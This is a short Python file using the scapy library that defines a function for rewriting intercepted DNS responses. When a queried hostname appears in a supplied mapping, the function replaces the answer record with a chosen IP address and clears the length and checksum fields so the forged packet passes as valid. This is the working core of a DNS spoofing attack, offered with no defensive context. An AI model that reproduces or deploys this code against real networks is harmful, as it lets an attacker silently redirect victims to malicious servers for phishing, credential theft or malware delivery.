from scapy.all import (
    DNSRR, DNSQR,
    DNS, UDP, IP
)


def modify_packet(packet, dns_hosts):
    qname = packet[DNSQR].qname

    if (qname not in dns_hosts):
        print(
            f"[*] no modification: {qname}"
        )
        return packet

    packet[DNS].an = DNSRR(
        rrname=qname,
        rdata=dns_hosts[qname]
    )

    packet[DNS].ancount = 1

    del packet[IP].len, packet[IP].chksum
    del packet[UDP].len, packet[UDP].chksum

    return packet

